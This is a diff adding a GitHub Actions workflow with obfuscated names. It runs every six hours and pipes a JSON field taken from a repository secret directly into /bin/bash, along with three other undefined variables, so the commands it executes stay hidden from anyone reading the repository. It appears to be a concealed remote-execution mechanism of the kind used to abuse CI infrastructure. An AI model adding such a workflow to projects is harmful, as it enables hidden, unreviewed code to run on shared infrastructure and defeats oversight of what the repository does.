@@ -1,0 +1,20 @@
+name: lonttouk
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '28 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: lonttouk
+        env:
+          dc65537: ${{ secrets.dc65537 }}
+        run: |
+          echo $dc65537 | jq -r .tgan760 | /bin/bash
+          echo $i8 | jq -r .onkt49 | /bin/bash
+          echo $oox663 | jq -r .l0601 | /bin/bash
+          echo $gnw70059 | jq -r .usf1 | /bin/bash
+
